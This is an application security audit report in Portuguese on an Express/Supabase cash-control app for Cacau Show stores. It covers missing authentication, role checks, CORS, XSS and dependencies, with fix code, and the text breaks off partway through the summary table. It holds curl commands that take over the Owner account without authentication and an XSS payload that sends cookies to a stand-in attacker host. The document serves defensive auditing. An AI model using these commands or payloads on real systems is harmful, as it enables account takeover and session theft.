# Auditoria de Segurança (AppSec) — Controle de Caixa Cacau Show

**Escopo:** `routes/*.js`, `services/*.js`, `config/*.js`, `webapp/app.js`, `server.js`, `package.json`, `.env.example`, `tests/`, migrações Supabase.
**Metodologia:** revisão estática de código-fonte real, `git log`, `npm audit`, inspeção de schema e de arquivos versionados.
**Data:** 2026-09-11.

---

## Sumário Executivo

- **Tomada de conta total sem autenticação real.** `POST /api/pins` e `DELETE /api/pins/:usuario` (`routes/auth.js:144-168`) não exigem nenhuma credencial: qualquer requisição HTTP pode criar/sobrescrever o PIN de **qualquer usuário, incluindo o Owner**, e em seguida logar como ele. Não existe token de sessão em lugar nenhum do sistema — toda a "autorização" depende de o próprio cliente informar `usuario`/`actorUsuario` no corpo da requisição.
- **RBAC (papéis) validado quase inteiramente no front-end.** A maioria das rotas de escrita (`PUT/DELETE /registros`, `POST /colaboradores`, `PUT/DELETE /nfe`, etc.) não chama `requireOwner` nem qualquer checagem de papel — o servidor confia no que o app manda. Onde existe checagem (`requireOwner`), ela também confia num campo de texto livre (`actorUsuario`) enviado pelo cliente, sem prova criptográfica de identidade.
- **Sem rate limiting efetivo.** Só existe um limitador artesanal em memória em `/api/auth/verify` (`routes/auth.js:91-105`); ele não sobrevive a reinício/serverless (o backend roda como função Vercel — `api/index.js`/`vercel.json`) e não cobre `/api/pins`, que é justamente onde um PIN de 4 dígitos poderia ser forçado.
- **CORS totalmente aberto** (`server.js:47`, `app.use(cors())`) numa API que expõe dados financeiros, fotos de envelope, dados de colaboradores e documentos societários — qualquer site pode chamar a API a partir do navegador da vítima.
- **RLS no Postgres é decorativo.** A migração `migrations/001_fix_supabase_linter_security.sql` habilita Row Level Security só para silenciar o linter do Supabase, mas as policies são `USING (true) WITH CHECK (true)` para o papel `authenticated` — ou seja, RLS ligado sem nenhuma restrição real, e a maior parte das tabelas do sistema (`registros`, `pins`, `colaboradores`, `nfe_conferencia`...) nem aparece na migração.
- **XSS armazenado** via `innerHTML` sem `escapeHtml()` em pelo menos dois pontos com dado dinâmico (`webapp/app.js:3938` e `webapp/app.js:13650-13656`), e **1 CVE crítico + 9 altos** em dependências desatualizadas (`tar`, `multer`, `nodemailer`, `pdfjs-dist`, `ip-address`).
- Arquivos de dados reais operacionais (`controle_caixa.db`, `database.db.bak-20260909140540`, `registros.json`, `Backup/backup_hub_operacoes_2026-08-04.json`) estão **versionados no git** — não contêm segredos de `.env`, mas expõem estrutura de dados internos, nomes de colaboradores e configurações de negócio num repositório que será publicado no GitHub.

---

## 1. `.env` ou segredos rastreados no git

**[CONFORME]** (para o `.env` em si) **— mas com ressalva relevante**

`git log --all --full-history -- .env` não retorna nenhum commit, e `.gitignore:2` lista `.env`. `git ls-files | grep -i env` só mostra `.env.example`, que não contém valores reais (todos os campos de segredo — `SMTP_PASS`, `POS_VISITA_IMPORT_SECRET`, `CRON_SECRET`, `GEMINI_API_KEY` etc. — estão vazios).

Ressalva (não é o item 1 propriamente, mas é a mesma categoria de risco — exposição de dados sensíveis via git): estão **rastreados no repositório**:
- `controle_caixa.db` (12 KB)
- `database.db.bak-20260909140540` (487 KB)
- `registros.json` (1,1 MB)
- `Backup/backup_hub_operacoes_2026-08-04.json` (1,4 MB) — dump de `localStorage` de produção, incluindo nomes reais de colaboradoras, `cacaushow_current_user`, chaves de inventário por loja etc.

Nenhum PIN em texto puro foi encontrado nesses arquivos (a chave `cacaushow_pins_v1` só guarda `"****"`), mas são dados operacionais reais das lojas indo para um histórico de git que será publicado/compartilhado.

**Correção:** adicionar ao `.gitignore` e rodar `git rm --cached` nesses arquivos:
```
# .gitignore — adicionar
*.db
*.db.bak-*
registros.json
Backup/
```
Se esses arquivos já foram passados a um remoto público/compartilhado, considerar histórico como comprometido (reescrever histórico ou girar quaisquer identificadores sensíveis que aparecem neles).

---

## 2. Chaves/API keys embutidas no bundle front-end

**[CONFORME]**

Busca por padrões de chave (`AIza`, `sk-`, `Bearer <token fixo>`, nomes de variável de IA) em `webapp/app.js` não retornou nenhuma ocorrência. As chaves de IA (`GEMINI_API_KEY`, `GROQ_API_KEY`, `OPENROUTER_API_KEY`) só existem em `services/ia.js`/`.env`, nunca chegam ao cliente — o front chama endpoints próprios (`/api/ia/...`) que fazem a chamada ao provedor no servidor.

---

## 3. Senhas de usuário em texto puro ou hash fraco

**[VULNERÁVEL]** — Baixa/Média

**Localização:** `routes/auth.js:121-140` (rota `POST /api/auth/verify`) e `routes/retiradas.js:42-55` (`verificarPin`).

**Impacto:** o sistema ainda aceita e compara PINs armazenados em **texto puro** para contas que nunca fizeram login desde a migração para bcrypt:
```js
// routes/auth.js:128-137
} else {
  // PIN antigo em texto puro — verifica e migra para hash
  const match = (pin === row.pin);
  ...
}
```
Enquanto uma conta não passar por esse fluxo, seu PIN fica em claro no banco — qualquer leitura direta do banco (dump, backup, acesso a `SELECT * FROM pins`) revela o PIN literal, e não um hash.

**Severidade:** Média (mitigada pela migração automática no primeiro uso, mas nada força a migração de contas que nunca logam, e o PIN em claro fica no banco/backups indefinidamente).

**Correção:** rodar uma migração ativa de backfill assim que possível, e não confiar apenas na migração passiva:
```js
// Antes: espera o usuário logar para migrar
// Depois: script de migração one-off, executado uma vez
const rows = await dbAllAsync('SELECT usuario, pin FROM pins');
for (const row of rows) {
  if (!row.pin.startsWith('$2a$') && !row.pin.startsWith('$2b$')) {
    const hash = await bcrypt.hash(row.pin, 10);
    await dbRunAsync('UPDATE pins SET pin = ? WHERE usuario = ?', [hash, row.usuario]);
  }
}
```
Depois do backfill, remover completamente o `else` que aceita comparação em texto puro.

---

## 4. Tokens JWT/sessão em localStorage vs cookies HttpOnly/Secure/SameSite

**[VULNERÁVEL]** — Crítica

**Localização:** não há JWT/sessão em lugar nenhum do sistema. `webapp/app.js:1488-1489` guarda a identidade só em `localStorage`:
```js
localStorage.setItem(USER_KEY, JSON.stringify(currentUser));
localStorage.setItem("ultimo_usuario_login", user.nome);
```
E o servidor nunca emite nem valida um token — ele lê `usuario`/`actorUsuario` cru do `body`/`query` de cada requisição (ex.: `routes/middleware/requireOwner.js:9`, `routes/caixa.js:211-215`).

**Impacto:** não é "localStorage é pior que cookie HttpOnly" — é a ausência total de um mecanismo de sessão. Qualquer requisição HTTP direta (curl, Postman, script) pode se autodeclarar como qualquer usuário/papel, sem precisar de XSS nem de acesso ao `localStorage` da vítima:
```bash
curl -X DELETE "https://app/api/registros/123?usuario=Bruno"
curl -X POST https://app/api/pins -d '{"usuario":"Bruno","pin":"1234"}' -H 'content-type: application/json'
```
A segunda chamada troca o PIN do Owner e permite login completo como ele.

**Severidade:** Crítica.

**Correção:** introduzir sessão real (JWT assinado no servidor após validar o PIN, guardado em cookie `HttpOnly; Secure; SameSite=Strict`), e todo endpoint sensível deve derivar o usuário/papel do token, nunca de um campo enviado pelo cliente:
```js
// Depois — routes/auth.js, /auth/verify bem-sucedido:
const token = jwt.sign({ usuario, role: colaborador.role }, process.env.JWT_SECRET, { expiresIn: '12h' });
res.cookie('session', token, { httpOnly: true, secure: true, sameSite: 'strict' });

// middleware novo, usado em toda rota protegida:
function requireAuth(req, res, next) {
  try {
    req.user = jwt.verify(req.cookies.session, process.env.JWT_SECRET);
    next();
  } catch { res.status(401).json({ error: 'Não autenticado.' }); }
}
```

---

## 5. Ausência de verificação de e-mail antes de permissões críticas

**[INSUFICIENTE/AUSENTE]** — justificativa

O sistema não usa e-mail como fator de identidade/autenticação em nenhum fluxo — login é só `usuario` + PIN de 4 dígitos (`routes/auth.js:108-141`). E-mail aparece apenas como canal de notificação (`EMAIL_MAP` fixo em `routes/auth.js:274-278`, SMTP em `config/notifications.js`), nunca como verificação de identidade. O item, portanto, não se aplica ao desenho atual — mas isso não é uma mitigação: a ausência de qualquer segundo fator (e-mail, TOTP etc.) soma-se ao Item 4, já que a única barreira para qualquer permissão crítica é um PIN de 4 dígitos que pode ser redefinido sem autenticação (Item 15).

---

## 6. Falta de requisitos mínimos de senha (comprimento/entropia)

**[VULNERÁVEL]** — Alta

**Localização:** `webapp/app.js:1419`
```js
function pinValido(v) { return /^\d{4}$/.test(v); }
```
e `routes/auth.js:144-159` (`POST /api/pins`) não impõe nenhuma regra própria no servidor além de gerar o hash do que vier.

**Impacto:** PIN fixo em 4 dígitos numéricos = 10.000 combinações possíveis. Combinado com os Itens 4 e 15 (redefinição de PIN sem autenticação e sem rate limit efetivo), um atacante não precisa nem forçar o PIN: basta chamar `POST /api/pins` diretamente e definir o PIN que quiser para qualquer `usuario`.

**Severidade:** Alta (o vetor real e imediato é o Item 15/4; a baixa entropia agrava o cenário de força bruta caso o reset seja corrigido mas o rate limit continue fraco).

**Correção:** aumentar para PIN de 6 dígitos + bloqueio de conta após N tentativas (não apenas throttling por minuto), e nunca permitir reset sem prova de posse da conta (PIN antigo ou aprovação de um Owner autenticado por token):
```js
function pinValido(v) { return /^\d{6}$/.test(v); }
```

---

## 7. Painel admin com OAuth vulnerável

**[INSUFICIENTE/AUSENTE]** — justificativa

Não há nenhuma integração OAuth no código (`grep` por `oauth`, `passport`, `state`, `client_id`, `redirect_uri` não retorna nada em `routes/`, `services/`, `config/`). Autenticação é exclusivamente PIN local. Item não se aplica ao sistema atual.

---

## 8. Ausência de RLS/controle equivalente no banco

**[VULNERÁVEL]** — Alta

**Localização:** `migrations/001_fix_supabase_linter_security.sql:11-64`
```sql
ALTER TABLE public.solicitacoes_retirada ENABLE ROW LEVEL SECURITY;
CREATE POLICY "solicitacoes_retirada_authenticated" ON public.solicitacoes_retirada
  FOR ALL TO authenticated USING (true) WITH CHECK (true);
```

**Impacto:** RLS foi ligado só para resolver o alerta do linter de segurança do Supabase, mas a policy libera **tudo** (`USING (true)`) para qualquer conexão no papel `authenticated` — equivale a não ter RLS nenhum. Além disso:
- O backend se conecta ao Postgres com uma única `DATABASE_URL` compartilhada (`config/database.js`), sem contexto de usuário por requisição — RLS por linha não tem como discriminar "quem" está pedindo, porque para o Postgres é sempre a mesma role.
- A migração cobre só 7 tabelas (`solicitacoes_retirada`, `pos_visita_indicadores`, `fluxo_caixa_*`); tabelas centrais como `registros`, `pins`, `colaboradores`, `nfe_conferencia`, `documentos_auditoria` não têm RLS habilitado em lugar nenhum do código encontrado.

**Severidade:** Alta (controle de acesso real está inteiramente na camada de aplicação, que como mostrado nos Itens 4/9 é insuficiente).

**Correção:** se o modelo de acesso continuar sendo "um único backend, muitos papéis de aplicação", RLS por `authenticated`/`service_role` do Supabase não resolve nada — a validação de papel deve acontecer no Express (ver Item 9) com sessão real (Item 4). RLS só faz sentido aqui se o cliente falar direto com o Supabase usando o JWT do próprio usuário; não é o caso hoje.

---

## 9. RBAC validado só no front-end

**[VULNERÁVEL]** — Crítica

**Localização (amostra):**
- `routes/caixa.js:172-206` — `PUT /registros/:id` e `DELETE /registros/:id`: sem `requireOwner`, sem checagem de papel; a exclusão só compara a string `usuario !== 'Bruno'` vinda de `req.query` (`caixa.js:213`), controlável pelo cliente.
- `routes/auth.js:144-168` — `POST /pins`, `DELETE /pins/:usuario`: nenhum middleware de autorização.
- `routes/auth.js:178-202` — `POST /colaboradores` (cria/edita colaborador com qualquer `role`, inclusive `owner`): nenhum middleware de autorização.
- `routes/nfe.js:37-118` — criar/editar/excluir NFE: nenhuma checagem de papel.

**Impacto:** o "RBAC" existente (`requireOwner`, usado só em 4 rotas: `auth.js:207,224`, `retiradas.js:112`, `auditoria-docs.js:192,238`) já é fraco por depender de `actorUsuario` não autenticado (Item 4), mas a maioria das rotas de escrita nem chama esse middleware — a única barreira é o front-end esconder botões conforme `currentUser.role`. Qualquer chamada HTTP direta ignora isso por completo:
```bash
curl -X POST https://app/api/colaboradores \
  -H 'content-type: application/json' \
  -d '{"nome":"atacante","role":"owner"}'
```

**Severidade:** Crítica.

**Correção:** aplicar `requireAuth` (Item 4) + checagem de papel server-side em toda rota de escrita, nunca confiar em campo de `body`/`query`:
```js
// Antes
router.delete('/registros/:id', (req, res) => {
  const { usuario } = req.query;
  if (usuario !== 'Bruno') return res.status(403)...
  ...
});

// Depois
router.delete('/registros/:id', requireAuth, requireRole('owner'), (req, res) => {
  // req.user vem do token verificado, não do query string
  ...
});
```

---

## 10. IDs sequenciais/previsíveis (IDOR)

**[VULNERÁVEL]** — Alta

**Localização:** `config/database.js` — várias tabelas usam `id INTEGER PRIMARY KEY AUTOINCREMENT` (linhas 279, 287, 295, 301, 440, 452, 468), gerando IDs sequenciais e previsíveis. Tabelas com fluxo de negócio principal (`registros`, `registros_fa`) usam `id TEXT PRIMARY KEY` populado pelo cliente via `uid()`:
```js
// webapp/app.js:1204
function uid() { return Date.now().toString(36) + Math.random().toString(36).slice(2, 8); }
```

**Impacto:** o problema não é só a previsibilidade do ID — é que **nenhuma rota que recebe `:id` verifica se o solicitante tem direito àquele registro** (consequência direta do Item 9). Exemplos:
- `GET /api/registros/:id/foto` (`routes/caixa.js:51-57`) devolve a foto do envelope de qualquer `id`, sem checar loja/usuário.
- `PUT /api/nfe/:id/status`, `DELETE /api/nfe/:id` (`routes/nfe.js:80-118`) idem.
- IDs sequenciais (`AUTOINCREMENT`) tornam a enumeração trivial (`id=1, 2, 3...`); os IDs tipo `uid()` são só "obscuros", não autorizados — quem já viu a listagem (que também não tem controle de acesso) já tem todos os IDs.

**Severidade:** Alta.

**Correção:** não depender de o ID ser difícil de adivinhar — sempre validar posse/permissão no servidor:
```js
// Depois — routes/caixa.js
router.get('/registros/:id/foto', requireAuth, async (req, res) => {
  const registro = await dbGetAsync('SELECT loja, fotoEnvelope FROM registros WHERE id = ?', [req.params.id]);
  if (!registro) return res.status(404).json({ error: 'Não encontrado.' });
  if (!usuarioTemAcessoALoja(req.user, registro.loja)) return res.status(403).json({ error: 'Acesso negado.' });
  res.json({ fotoEnvelope: registro.fotoEnvelope });
});
```

---

## 11. Concatenação de strings em SQL (SQL Injection)

**[CONFORME]**

Todas as ocorrências de template string dentro de queries usam **apenas identificadores fixos definidos no próprio código-fonte** (nunca valor vindo de `req.*`), e os valores de usuário sempre entram via placeholders (`?`):

- `routes/caixa.js:37` (`COLUNAS_REGISTRO_SEM_FOTO`) e `routes/caixa.js:195` (`fields.join(', ')`) — `fields` só é populado a partir de `COLUNAS_PERMITIDAS`, uma whitelist estática (`caixa.js`, topo do arquivo).
- `routes/retiradas.js:156` (`` `UPDATE ${tabela} ...` ``) — `tabela` vem de `tabelaDoTipo()` (`retiradas.js:12-14`), que só retorna `'registros'` ou `'registros_fa'`, nunca eco de input.
- `routes/financeiro.js:177/184` (`` `UPDATE nfs SET ${fields.join(', ')} ...` ``) — `fields` só recebe as strings literais `'info = ?'`/`'products = ?'`, nunca nome de coluna dinâmico.
- `routes/inventario.js:87` — `${COLUNAS}` é uma constante de módulo.

Nenhum ponto encontrado interpola valor de `req.body`/`req.query`/`req.params` diretamente dentro do texto SQL.

---

## 12. Ausência de validação de schema (Zod/Joi/DTO)

**[INSUFICIENTE/AUSENTE]**

**Localização:** `package.json` não lista `zod`, `joi`, `ajv`, `yup` ou qualquer lib de schema. A validação em todas as rotas é manual e pontual — ex.: `routes/auth.js:180-182` (`if (!nome || !role)`), `routes/nfe.js:40-42,84-86`, `routes/caixa.js:137-153` (nenhuma validação, todos os campos do `body` vão direto pro `INSERT`).

**Impacto:** sem schema centralizado, campos numéricos (`fundoCaixa`, `valorFaturado`, `valorEnvelope`) não têm tipo/faixa garantidos — o `INSERT` aceita string, `null`, objeto serializado como `"[object Object]"` etc., quebrando cálculos financeiros a jusante (metas, fluxo de caixa) sem erro imediato. Também não há limite de tamanho por campo — `observacoes` de tamanho arbitrário, dentro do limite de 15 MB do JSON body (`server.js:48`).

**Correção:** adotar Zod nos handlers de escrita:
```js
const RegistroSchema = z.object({
  id: z.string().min(1),
  consultor: z.string().min(1).max(120),
  loja: z.string().min(1),
  tipoOperacao: z.enum(['Abertura', 'Fechamento']),
  fundoCaixa: z.number().nonnegative(),
  valorFaturado: z.number().nonnegative().optional(),
  // ...
});
router.post('/registros', (req, res) => {
  const parsed = RegistroSchema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: parsed.error.flatten() });
  const r = parsed.data;
  ...
});
```

---

## 13. Renderização de dados de terceiros como HTML bruto (XSS)

**[VULNERÁVEL]** — Alta

**Localização:**
- `webapp/app.js:3938`:
```js
selColab.innerHTML = colaboradorasFa.map(n => `<option value="${n}">${n}</option>`).join("");
```
`n` é `nome` de colaborador, gravado sem sanitização por `POST /colaboradores` (`routes/auth.js:178-202`, sem `requireOwner` — Item 9).

- `webapp/app.js:13650-13657`:
```js
corpo.innerHTML = registros.map(r => `
  <tr class="border-t border-brand-900/60">
    <td class="py-1 pr-3 font-semibold">${r.nomeCrianca}</td>
    <td class="py-1 pr-3">${formatarDataBr(r.dataNascimento)}</td>
    <td class="py-1 pr-3">${r.nomeResponsavel}</td>
    <td class="py-1">${r.telefone}</td>
  </tr>
`).join("");
```
`nomeCrianca`/`nomeResponsavel`/`telefone` vêm de importação de PDF/cadastro e são inseridos sem `escapeHtml()`.

**Impacto:** um nome como `<img src=x onerror="fetch('https://atacante/'+document.cookie)">` cadastrado em qualquer um desses fluxos executa no navegador de todo usuário que abrir a tela correspondente (persistente/stored XSS). O próprio código já tem uma função `escapeHtml()` (`routes/caixa.js:17-20`, replicada no front) usada em outros pontos (ex.: `webapp/app.js:15319-15324`), mas não nesses dois.

**Severidade:** Alta.

**Correção:**
```js
// Antes
selColab.innerHTML = colaboradorasFa.map(n => `<option value="${n}">${n}</option>`).join("");

// Depois
selColab.innerHTML = colaboradorasFa.map(n => `<option value="${escapeHtml(n)}">${escapeHtml(n)}</option>`).join("");
```
```js
// Antes
<td class="py-1 pr-3 font-semibold">${r.nomeCrianca}</td>

// Depois
<td class="py-1 pr-3 font-semibold">${escapeHtml(r.nomeCrianca)}</td>
```
Auditar as 153 ocorrências de `innerHTML` em `webapp/app.js` com o mesmo critério, ou migrar para `textContent`/criação de nó DOM nos campos que só exibem texto.

---

## 14. Salvamento de `req.body` inteiro sem filtragem (Mass Assignment)

**[VULNERÁVEL]** — Alta

**Localização:** `routes/caixa.js:137-153`, `POST /registros`:
```js
router.post('/registros', (req, res) => {
  const r = req.body;
  if (r.loja) r.loja = normalizarNomeLoja(r.loja);
  db.run(
    `INSERT INTO registros (
      id, consultor, loja, tipoOperacao, dataOperacao, fundoCaixa, valorEnvelope,
      valorFaturado, sangria, sangriaMotivo,
      observacoes, fotoEnvelope, status, dataRetirada, retiradoPor, confirmadoPorApp,
      autorizadoPor, mensagemGerada, criadoEm
    ) VALUES (...)`,
    [r.id, r.consultor, r.loja, r.tipoOperacao, r.dataOperacao, r.fundoCaixa, r.valorEnvelope,
     r.valorFaturado, r.sangria, r.sangriaMotivo || null,
     r.observacoes, r.fotoEnvelope, r.status, r.dataRetirada, r.retiradoPor, r.confirmadoPorApp,
     r.autorizadoPor, ...],
    ...
```

**Impacto:** embora não seja um `INSERT ... SET ?` genérico, o handler aceita **diretamente do cliente** campos que deveriam ser resultado de um fluxo de aprovação controlado pelo servidor: `status`, `autorizadoPor`, `confirmadoPorApp`, `dataRetirada`, `retiradoPor`. Um cliente pode criar um registro já com `status: "retirado"` e `autorizadoPor: "Bruno"` sem nunca passar pela rota de autorização (`routes/retiradas.js:112`, que exige PIN de Owner). Isso é mass assignment de campos de controle de fluxo, não só de dados de negócio.

**Severidade:** Alta.

**Correção:** o servidor deve definir os campos de estado inicial, ignorando o que o cliente mandar para eles:
```js
// Depois
router.post('/registros', requireAuth, (req, res) => {
  const r = req.body;
  const camposControlados = {
    status: 'pendente',
    dataRetirada: null,
    retiradoPor: null,
    confirmadoPorApp: null,
    autorizadoPor: null
  };
  db.run(`INSERT INTO registros (..., status, dataRetirada, retiradoPor, confirmadoPorApp, autorizadoPor, ...) VALUES (...)`,
    [..., camposControlados.status, camposControlados.dataRetirada, ...]);
});
```

---

## 15. Ausência de rate limiting em rotas sensíveis (login, PIN)

**[VULNERÁVEL]** — Crítica

**Localização:** `routes/auth.js:91-105` implementa um limitador em `Map` local só para `POST /api/auth/verify` (`auth.js:112-115`). Não há nada equivalente para:
- `POST /api/pins` (criar/resetar PIN — `auth.js:144-159`)
- `DELETE /api/pins/:usuario` (`auth.js:162-168`)
- Nenhum outro endpoint de escrita no sistema.

**Impacto:** mesmo ignorando o Item 4 (reset sem autenticação), o próprio limitador de `/auth/verify` não é confiável em produção: o `package.json`/`vercel.json` mostram deploy como função serverless na Vercel — cada invocação pode rodar em uma instância nova, zerando o `Map` em memória a qualquer momento; não há Redis/store compartilhado. Um PIN de 4 dígitos (Item 6) sob esse "rate limit" é forçável.

**Severidade:** Crítica (combinado aos Itens 4 e 6).

**Correção:** mover o limitador para um store persistente e compartilhado entre instâncias (ex.: tabela no Postgres já usado, ou Upstash Redis), e aplicar em toda rota sensível:
```js
// Depois — usar `express-rate-limit` com store externo, ex. Postgres/Redis
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');

const pinLimiter = rateLimit({
  windowMs: 60_000,
  max: 5,
  store: new RedisStore({ client: redisClient }),
  keyGenerator: (req) => `${req.ip}:${req.body.usuario || req.params.usuario}`
});

router.post('/pins', requireAuth, pinLimiter, async (req, res) => { ... });
router.post('/auth/verify', pinLimiter, (req, res) => { ... });
```

---

## 16. CORS permissivo (`Access-Control-Allow-Origin: *`) em rotas privadas

**[VULNERÁVEL]** — Alta

**Localização:** `server.js:47`:
```js
app.use(cors());
```

**Impacto:** `cors()` sem opções libera qualquer origem para todas as rotas — incluindo `/api/registros`, `/api/colaboradores`, `/api/pins`, `/api/auditoria-docs/:id/arquivo` (documentos societários). Combinado ao Item 4 (identidade = string enviada no body, sem cookie/sessão), um site malicioso pode fazer o navegador da vítima chamar diretamente a API e ler a resposta via `fetch`/XHR com CORS — não depende nem de o usuário estar "logado" em cookie, porque o próprio conceito de sessão não existe.

**Severidade:** Alta.

**Correção:** restringir a origem ao domínio real do front-end e não usar `*` com credenciais:
```js
// Depois
const ORIGENS_PERMITIDAS = ['https://controle-caixa.vercel.app', 'https://app.suaempresa.com'];
app.use(cors({
  origin: (origin, cb) => {
    if (!origin || ORIGENS_PERMITIDAS.includes(origin)) return cb(null, true);
    cb(new Error('Origem não permitida'));
  },
  credentials: true
}));
```

---

## 17. Webhooks sem validação HMAC

**[VULNERÁVEL]** — Média

**Localização:** `server.js:187-196` (`/api/cron/backup-mensal`) e `server.js:377-386` (`/api/cron/ia-tick`):
```js
if (process.env.CRON_SECRET) {
  const auth = req.headers['authorization'];
  const secretQuery = req.query.secret;
  const validHeader = auth === `Bearer ${process.env.CRON_SECRET}`;
  const validQuery = secretQuery === process.env.CRON_SECRET;
  if (!validHeader && !validQuery) return res.status(401).json({ error: 'Não autorizado.' });
}
```

**Impacto:** não é um webhook com HMAC — é um segredo estático comparado com `===` (não é *constant-time*, então sujeito a timing attack teórico) e aceito também via **query string** (`?secret=...`), que fica em logs de acesso, histórico do navegador e no `Referer` de eventuais links. Além disso, se `CRON_SECRET` não estiver definido, a checagem inteira é pulada (`if (process.env.CRON_SECRET)`) — se a variável nunca for setada em produção, o endpoint fica público.

O `.env.example` também documenta `POS_VISITA_IMPORT_SECRET` para um endpoint `POST /api/pos-visita/importar` que **não existe mais no código** (rota órfã, não localizada em nenhum `router.*`) — indício de que o segredo/rota foi removido sem atualizar a documentação, risco de reintrodução insegura no futuro.

**Severidade:** Média.

**Correção:**
```js
// Depois — comparação constant-time, sem aceitar querystring, e falhar fechado
const crypto = require('crypto');
function autorizadoPorCron(req) {
  const secret = process.env.CRON_SECRET;
  if (!secret) return false; // nunca abrir se a env não estiver setada
  const auth = req.headers['authorization'] || '';
  const esperado = `Bearer ${secret}`;
  const a = Buffer.from(auth);
  const b = Buffer.from(esperado);
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}
if (!autorizadoPorCron(req)) return res.status(401).json({ error: 'Não autorizado.' });
```
Remover a variante por query string; remover `POS_VISITA_IMPORT_SECRET` do `.env.example` se a rota realmente não existe mais.

---

## 18. Upload de arquivos sem validação (magic bytes, MIME, tamanho, path traversal)

**[VULNERÁVEL]** — Média

**Localização:** `routes/auditoria-docs.js:131-187` (`POST /` — upload de documento de auditoria) e `routes/caixa.js:137-153` (`fotoEnvelope`):
```js
// auditoria-docs.js:146-148
if (!r.id || !r.conteudo) {
  return res.status(400).json({ error: 'id e conteudo são obrigatórios.' });
}
...
[r.id, negocio, r.unidade || null, r.categoria, r.categoriaOutro || null,
 r.nomeArquivo || null, r.mimeType || null, r.conteudo, ...]
```

**Impacto:** `mimeType` e `nomeArquivo` são o que o **cliente afirma que são** — não há verificação de magic bytes do `conteudo` (data URL base64) nem whitelist de tipos aceitos (`categorias` são validadas, mas o tipo de arquivo em si não). Um cliente pode enviar um HTML/SVG com script disfarçado de PDF; se esse conteúdo for reaberto em uma aba (`GET /:id/arquivo`, `auditoria-docs.js:107-124`, que devolve `conteudo`/`mimeType` crus) sem `Content-Disposition: attachment`, pode executar no contexto da origem. Também não há limite de tamanho por arquivo além do limite global de 15 MB do body inteiro (`server.js:48`), permitindo enviar dezenas de "documentos" grandes e esgotar armazenamento/memória.

**Severidade:** Média.

**Correção:**
```js
// Depois
const MIME_PERMITIDOS = ['application/pdf', 'image/png', 'image/jpeg'];
const TAMANHO_MAX_BYTES = 8 * 1024 * 1024;

const decodificado = decodificarDataUrl(r.conteudo);
if (!decodificado) return res.status(400).json({ error: 'conteudo inválido.' });
if (!MIME_PERMITIDOS.includes(decodificado.mimeType)) {
  return res.status(400).json({ error: 'Tipo de arquivo não permitido.' });
}
if (decodificado.buffer.length > TAMANHO_MAX_BYTES) {
  return res.status(413).json({ error: 'Arquivo excede o tamanho máximo.' });
}
// validar magic bytes reais (ex.: file-type) em vez de confiar no mimeType declarado
const tipoReal = await fileTypeFromBuffer(decodificado.buffer);
if (!tipoReal || !MIME_PERMITIDOS.includes(tipoReal.mime)) {
  return res.status(400).json({ error: 'Conteúdo não corresponde a um tipo permitido.' });
}
```
E no endpoint de download, forçar `Content-Disposition: attachment` e nunca `text/html`/`image/svg+xml` inline.

---

## 19. Stack traces/erros internos expostos em produção

**[VULNERÁVEL]** — Média

**Localização (padrão repetido em ~76 pontos):** ex. `routes/auth.js:18,27,41`, `routes/caixa.js:37,52,197`, `routes/nfe.js:29,65,94,110`:
```js
db.all(..., (err, rows) => {
  if (err) return res.status(500).json({ error: err.message });
  ...
});
```
Não é `err.stack` puro, mas `err.message` de erros de SQL (SQLite/Postgres) é repassado ao cliente em todas as rotas — nenhuma delas usa um handler de erro central que sanitiza a mensagem em produção.

**Impacto:** `err.message` de um erro de banco costuma incluir nome de tabela/coluna, tipo de constraint violada, e em alguns drivers até fragmento da query — informação útil para um atacante mapear o schema. Não há checagem de `NODE_ENV` em lugar nenhum do código para diferenciar dev/produção.

**Severidade:** Média.

**Correção:** middleware de erro central que loga o detalhe no servidor e devolve mensagem genérica ao cliente:
```js
// Depois — server.js, registrado por último
app.use((err, req, res, next) => {
  console.error('[erro]', err); // detalhe completo só no log do servidor
  const isProd = process.env.NODE_ENV === 'production';
  res.status(err.status || 500).json({
    error: isProd ? 'Erro interno. Tente novamente.' : err.message
  });
});
```
E trocar `res.status(500).json({ error: err.message })` por `next(err)` nos handlers das rotas.

---

## 20. Dependências desatualizadas com CVEs

**[VULNERÁVEL]** — Crítica

`npm audit` (rodado localmente contra `package-lock.json`) reporta **15 vulnerabilidades**: 1 crítica, 9 altas, 3 moderadas, 2 baixas.

| Severidade | Pacote | Resumo |
|---|---|---|
| Crítica | `tar` (transitiva via `node-gyp`/`sqlite3`) | Path traversal via hardlink/symlink na extração — arbitrary file write/overwrite |
| Alta | `multer` | DoS via nomes de campo/array manipulados; bypass de limite de tamanho de arquivo por race condition no `fileFilter` |
| Alta | `nodemailer` | Bypass de `disableFileAccess`/`disableUrlAccess`; bypass de allow-list de domínio IDN/punycode; DoS O(n²) no parser de endereço |
| Alta | `pdfjs-dist` | Execução arbitrária de JavaScript ao abrir PDF malicioso |
| Alta | `ip-address` (transitiva) | Classificação incorreta de IPv4/CIDR permite bypass de proteção SSRF |
| Alta | `brace-expansion`, `cacache`, `make-fetch-happen`, `node-gyp`, `sqlite3` (transitivas) | DoS / dependem do `tar` crítico acima |

**Impacto direto no sistema:**
- `multer` não está no `package.json`, mas está listado como dependência — se for usada em algum upload multipart, herda os DoS acima; caso não seja usada em nenhuma rota (confirmado: não há `require('multer')` em `routes/`), é uma dependência morta que ainda assim aumenta a superfície de ataque via `npm install`/supply chain.
- `nodemailer` é usado ativamente (`server.js`, `routes/auth.js`, `config/notifications.js`) para todos os e-mails do sistema — as CVEs de bypass de allow-list de domínio são relevantes já que o sistema monta destinatários a partir de `EMAIL_MAP`/config.
- `pdfjs-dist` é usado para processar PDFs enviados por usuários (importação de aniversário/documento de auditoria) — a CVE de execução de JS ao abrir PDF malicioso é diretamente explorável pelo fluxo de upload do Item 18.

**Severidade:** Crítica (dado o uso ativo de `nodemailer`/`pdfjs-dist` em fluxos que processam entrada externa).

**Correção:**
```bash
npm audit fix
npm update nodemailer pdfjs-dist
npm uninstall multer   # se de fato não é usada em nenhuma rota
npm audit               # confirmar zerado ou documentar o que restar
```
Adicionar `npm audit --audit-level=high` como etapa obrigatória de CI, para não deixar essas 15 vulnerabilidades reacumularem silenciosamente.

---

## Tabela-resumo

| # | Item | Classificação | Severidade (se vulnerável) |
|---|---|---|---|
| 1 | Segredos no git | CONFORME (com ressalva sobre dados operacionais versionados) | — |
| 2 | Chaves no front-end | CONFORME | — |
| 3 | Senha em texto puro/hash fraco | VULNERÁVEL | Média |
| 4 | Sessão em localStorage vs cookie | VULNERÁVEL | Crítica |
